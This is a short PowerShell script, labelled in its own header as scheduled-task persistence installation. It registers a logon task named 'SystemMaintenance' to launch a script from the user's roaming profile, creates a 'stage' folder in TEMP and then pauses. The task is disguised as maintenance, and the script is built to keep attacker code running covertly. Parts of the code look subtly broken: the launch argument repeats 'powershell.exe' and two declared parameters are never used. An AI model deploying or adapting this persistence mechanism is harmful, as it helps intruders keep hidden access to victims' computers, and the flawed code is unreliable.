
<#
.SYNOPSIS
    Scheduled-task persistence installation.

.DESCRIPTION
    Registers a per-user logon task that launches a PowerShell
    PowerShell file from the roaming profile.
#>
[CmdletBinding()]
param(
    [string]$TaskName = "SystemMaintenance",
    [string]$ScriptPath = "$env:APPDATA\updater.ps1",
    [int]$StartDelayMinutes = 32
)
$ErrorActionPreference = "Stop"

$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\updater.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force
$TaskState = Get-ScheduledTask -TaskName $TaskName
Write-Verbose ("Task state: " + $TaskState.State)

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Start-Sleep -Seconds 43
